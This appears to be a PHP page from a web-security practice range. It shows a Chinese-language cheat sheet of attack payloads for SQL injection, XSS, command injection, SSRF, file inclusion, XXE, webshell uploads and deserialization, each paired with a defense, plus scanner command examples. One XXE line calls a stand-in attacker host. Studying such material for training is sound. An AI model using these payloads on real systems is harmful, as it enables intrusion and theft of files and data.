<?php
require_once dirname(__DIR__) . '/config.php';
if (session_status() === PHP_SESSION_NONE) session_start();
require_once APP_ROOT . '/includes/layout.php';
if (empty($_SESSION['user'])) { header('Location: /login.php'); exit; }

render_header('知识库', null);

$CHEATSHEET = [
    'SQL 注入' => [
        'owasp' => 'A03:2021-Injection',
        'payloads' => [
            '整数型' => 'id=1 OR 1=1　id=-1 UNION SELECT 1,2,3',
            '字符型' => "id=1' OR '1'='1　id=1'--",
            '报错' => "id=1' AND updatexml(1,concat(0x7e,version()),1)--",
            '布尔盲注' => "id=1' AND substr(version(),1,1)='5'--",
            '时间盲注' => "id=1' AND SLEEP(3)--",
            '宽字节' => "id=1%df' OR 1=1--",
        ],
        'defense' => 'PDO 预处理参数化查询（prepare + execute），禁止拼接 SQL。注：本靶场为 SQLite——无 updatexml/SLEEP/information_schema，报错注入用 UNION 替代、时间盲注用 randomblob() 替代；上表 payload 以 MySQL 语法为主，供打 MySQL 靶场参考',
    ],
    'XSS' => [
        'owasp' => 'A03:2021-Injection',
        'payloads' => [
            '基础' => '<script>alert(1)</script>',
            'img' => '<img src=x onerror=alert(1)>',
            'svg' => '<svg onload=alert(1)>',
            '属性闭合' => '"><script>alert(1)</script>',
            '大小写' => '<ScRiPt>alert(1)</ScRiPt>',
            '双写' => '<scrscriptipt>alert(1)</scrscriptipt>',
            '编码' => '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',
        ],
        'defense' => 'htmlspecialchars(ENT_QUOTES) 输出转义 + CSP 头 + HttpOnly Cookie',
    ],
    '文件上传' => [
        'owasp' => 'A04:2021-Insecure Design',
        'payloads' => [
            '直接上传' => 'shell.php → webshell',
            '改扩展名' => 'shell.PHP / shell.phtml / shell.pht',
            '双扩展名' => 'shell.php.jpg（Apache 解析）',
            '图片马' => 'GIF89a + PHP 代码',
            '.htaccess' => 'AddType application/x-httpd-php .jpg',
            '空字节' => 'shell.php%00.jpg（PHP 5.x）',
        ],
        'defense' => '白名单 + 文件头检测 + 随机重命名 + 存储到非 web 目录',
    ],
    '命令注入' => [
        'owasp' => 'A03:2021-Injection',
        'payloads' => [
            '分号' => '127.0.0.1;id',
            '管道' => '127.0.0.1|id',
            '反引号' => '127.0.0.1;`id`',
            '$()' => '127.0.0.1;$(id)',
            '换行' => '127.0.0.1%0aid',
            '空格绕过' => 'cat${IFS}/etc/passwd',
        ],
        'defense' => 'escapeshellarg() + 白名单验证输入 + 不拼接命令',
    ],
    'CSRF' => [
        'owasp' => 'A01:2021-Broken Access Control',
        'payloads' => [
            '跨站表单' => '<form action="http://target/changepwd" method="POST">...',
            'img GET' => '<img src="http://target/del?id=1">',
            'AJAX' => 'fetch("http://target/...", {method:"POST",...})',
        ],
        'defense' => 'CSRF Token + SameSite Cookie + 验证 Referer',
    ],
    'SSRF' => [
        'owasp' => 'A10:2021-SSRF',
        'payloads' => [
            '内网访问' => 'url=http://127.0.0.1/',
            '读文件' => 'url=file:///etc/passwd',
            'IP绕过' => 'url=http://0.0.0.0/ 或 http://2130706433/',
            '协议绕过' => 'url=gopher://127.0.0.1:6379/...',
        ],
        'defense' => '白名单域名 + 禁止内网 IP + 限制协议 + DNS 重绑定防护',
    ],
    '文件包含' => [
        'owasp' => 'A03:2021-Injection',
        'payloads' => [
            'LFI' => 'page=../../../etc/passwd',
            '路径穿越' => 'page=....//....//etc/passwd',
            '伪协议读源码' => 'page=php://filter/convert.base64-encode/resource=index',
            '伪协议执行' => 'page=php://input + POST: <?php system("id");?>',
        ],
        'defense' => '白名单 + 路径规范化(realpath) + 禁止远程包含',
    ],
    'XXE' => [
        'owasp' => 'A05:2021-Security Misconfiguration',
        'payloads' => [
            '读文件' => '<!ENTITY e SYSTEM "file:///etc/passwd">',
            'OOB' => '<!ENTITY % e SYSTEM "http://evil/dtd"> %e;',
        ],
        'defense' => 'libxml_disable_entity_loader(true) + 禁用 DTD + 使用 JSON',
    ],
    '反序列化' => [
        'owasp' => 'A08:2021-Software and Data Integrity Failures',
        'payloads' => [
            '基础' => 'O:4:"Evil":1:{s:3:"cmd";s:6:"whoami";}',
            'POP链' => '构造 __wakeup → __toString → __call 链',
            'phar' => 'phar://uploads/shell.phar 触发元数据反序列化',
        ],
        'defense' => '不反序列化用户输入 + 使用 JSON + 签名验证',
    ],
    '逻辑漏洞' => [
        'owasp' => 'A01:2021-Broken Access Control',
        'payloads' => [
            '水平越权' => '修改 id 参数访问他人数据',
            '垂直越权' => '普通用户直接请求 admin 接口',
            '验证码绕过' => '删除验证码参数 / 复用验证码',
            '条件竞争' => '并发请求利用时间窗口',
        ],
        'defense' => '检查当前用户对资源的权限 + 原子操作 + 验证码一次性',
    ],
];
?>

<h2>📖 漏洞知识库</h2>
<p>漏洞速查 + 常用 payload + 防御方案</p>

<?php foreach ($CHEATSHEET as $vuln => $info): ?>
  <div class="card">
    <h3><?= h($vuln) ?> <small style="color:#8b949e"><?= h($info['owasp']) ?></small></h3>
    <h4>常用 Payload</h4>
    <table class="result">
      <tr><th>类型</th><th>Payload</th></tr>
      <?php foreach ($info['payloads'] as $type => $payload): ?>
        <tr><td><?= h($type) ?></td><td><code><?= h($payload) ?></code></td></tr>
      <?php endforeach; ?>
    </table>
    <h4>🛡️ 防御方案</h4>
    <p class="defense"><?= h($info['defense']) ?></p>
  </div>
<?php endforeach; ?>

<div class="card">
  <h3>🔧 常用工具</h3>
  <table class="result">
    <tr><th>工具</th><th>用途</th><th>命令示例</th></tr>
    <tr><td>sqlmap</td><td>SQL 注入自动化</td><td><code>sqlmap -u "http://target/?id=1" --dbs</code></td></tr>
    <tr><td>Burp Suite</td><td>Web 渗透代理</td><td>抓包/Repeater/Intruder</td></tr>
    <tr><td>XSStrike</td><td>XSS 检测</td><td><code>python3 xsstrike.py -u "http://target/?q=x"</code></td></tr>
    <tr><td>ffuf</td><td>模糊测试</td><td><code>ffuf -u "http://target/FUZZ" -w wordlist.txt</code></td></tr>
    <tr><td>nuclei</td><td>漏洞扫描</td><td><code>nuclei -u http://target -t cves/</code></td></tr>
  </table>
</div>

<?php render_footer();
